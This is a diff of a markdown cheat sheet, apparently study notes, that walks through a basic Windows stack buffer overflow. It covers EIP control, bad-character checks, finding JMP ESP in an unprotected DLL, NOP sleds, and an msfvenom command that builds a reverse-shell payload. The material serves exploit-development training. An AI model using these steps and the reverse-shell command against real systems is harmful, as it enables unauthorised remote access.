@@ -1,6 +1,6 @@
 # Stack Overflow - Basic
 
-1. Crash the application. ("A" buffer.)
+#### Crash the application. ("A" buffer.)
 
 ```python
 ...
@@ -10,7 +10,7 @@ buffer = "A" * size
 ...
 ```
 
-2. Control the EIP.
+#### Control the EIP.
 
 ```bash
 ┌──(v0lk3n㉿Laptop)-[~/StackOverflow-Basic]
@@ -26,7 +26,7 @@ buffer = "A" * size
 #Let's say EIP offset = 2600
 ```
 
-3. Verify that you control EIP. ("A" + "B" + "C" buffer.)
+#### Verify that you control EIP. ("A" + "B" + "C" buffer.)
 
 ```python
 ...
@@ -38,7 +38,7 @@ shellcode = "C" * (size - len(buffer) - len(eip))
 ...
 ````
 
-4. Locate Space for our shellcode. ("A" + "B" + "C" buffer.) 
+#### Locate Space for our shellcode. ("A" + "B" + "C" buffer.) 
 
 ```python
 size = 3000
@@ -72,7 +72,7 @@ shellcode = "D" * 692
 ...
 ```
 
-5. Calculate Space for our shellcode.  ("A" + "B" + "C" + "D" buffer, where "C" is our 8 offset, and "D" is our shellcode place.) 
+#### Calculate Space for our shellcode.  ("A" + "B" + "C" + "D" buffer, where "C" is our 8 offset, and "D" is our shellcode place.) 
 
 Check the Beginning of the "D" buffer.
 
@@ -92,7 +92,7 @@ Calcule the place for our shellcode.
 0:005> ? <End of the buffer> - <Beginning of the buffer>
 ```
 
-6. Checking for bad characters. (0x00 is not in the list and is considered as bad char)
+#### Checking for bad characters. (0x00 is not in the list and is considered as bad char)
 
 ```python
  ...
@@ -128,7 +128,7 @@ Calcule the place for our shellcode.
 0:005> db esp - 10 L110
 ```
 
-7. Finding a JMP ESP instruction.
+#### Finding a JMP ESP instruction.
 
 Locate a dll without protection (SEH OFF) using the WinDbg extension <a href="https://code.google.com/archive/p/narly/">"Narly"</a>
 
@@ -162,7 +162,7 @@ start    end        module name
 ...
 ```
 
-8. Replace the B buffer with JMP ESP instruction (EIP).
+#### Replace the B buffer with JMP ESP instruction (EIP).
 
 ```python
 ...
@@ -175,14 +175,14 @@ shellcode = b"D" * 692
 ...
 ```
 
-9. Set a breakpoint to JMP ESP, continue the execution flow, and run the PoC.
+#### Set a breakpoint to JMP ESP, continue the execution flow, and run the PoC.
 
 ```bash
 0:005> bp 124060cf
 0:005> g
 ```
 
-10. Walking throught the code with "t" command, once we reach the next instruction of "JMP ESP", read the value of esp register to confirm it contain our bunch of "D".
+#### Walking throught the code with "t" command, once we reach the next instruction of "JMP ESP", read the value of esp register to confirm it contain our bunch of "D".
 
 ```bash
 ...
@@ -191,15 +191,15 @@ shellcode = b"D" * 692
 0:005> dc esp L4
 ```
 
-11. Replace our bunch of D with our shellcode excluding the found badchars (only 0x00 in our case).
+#### Replace our bunch of D with our shellcode excluding the found badchars (only 0x00 in our case).
 
 ```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port> -b "\x00" -f python -v shellcode
 ```
 
-12. Execute our exploit and get a shell.
+Execute our exploit and get a shell.
 
-14. If after executing the PoC you didn't get a shell, analyse the crash.
+#### If after executing the PoC you didn't get a shell, analyse the crash.
 
 If you see that you'r shellcode is mangled, you can use NOPs instruction before the shellcode, those instruction will be executed since it reach the shellcode to execute it.
 
@@ -217,13 +217,13 @@ shellcode = <Shellcode Here>
  
  ## Sometimes ...
  
- ### Not enough space to test bad characters.
+#### Not enough space to test bad characters.
 
- Sometime, if you didn't have enough size to test all the bad characters in one shot.
+Sometime, if you didn't have enough size to test all the bad characters in one shot.
  
- To overcome this, you can comment all the badchars line, and send the maximum badchars size possible at a time.
+To overcome this, you can comment all the badchars line, and send the maximum badchars size possible at a time.
 
-### Not enough space for the shellcode.
+#### Not enough space for the shellcode.
 
 If you cant find enought space for the shellcode, once you get the JMP ESP instruction, check if any others registers redirect to our buffer (it can be the "A" buffer too).
  
@@ -236,7 +236,7 @@ nasm > JMP ECX
 00000000  FFE1              jmp ecx
 ```
 
- Complete the address with NOPs instructions to redirect the flow to it.
+Complete the address with NOPs instructions to redirect the flow to it.
  
 ```python
 ...
